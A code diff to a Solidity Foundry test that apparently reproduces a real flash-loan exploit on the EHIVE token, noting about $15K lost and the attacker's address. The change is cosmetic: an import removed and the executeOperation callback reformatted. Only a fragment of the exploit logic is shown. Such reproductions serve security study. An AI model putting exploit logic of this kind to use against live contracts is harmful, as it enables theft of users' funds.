@@ -2,7 +2,6 @@
 pragma solidity ^0.8.10;
 
 import "forge-std/Test.sol";
-import "./../interface.sol";
 
 // @KeyInfo - Total Lost : ~$15K
 // Attacker : https://etherscan.io/address/0x0195448a9c4adeaf27002c6051c949f3c3234bb5
@@ -79,13 +78,10 @@ contract EHIVETest is Test {
         );
     }
 
-    function executeOperation(
-        address asset,
-        uint256 amount,
-        uint256 premium,
-        address initiator,
-        bytes calldata params
-    ) external returns (bool) {
+    function executeOperation(address asset, uint256 amount, uint256 premium, address initiator, bytes calldata params)
+        external
+        returns (bool)
+    {
         WETHToEHIVE();
         EHIVE.transfer(contractList[0], EHIVE.balanceOf(address(this)));
         // Start exploit
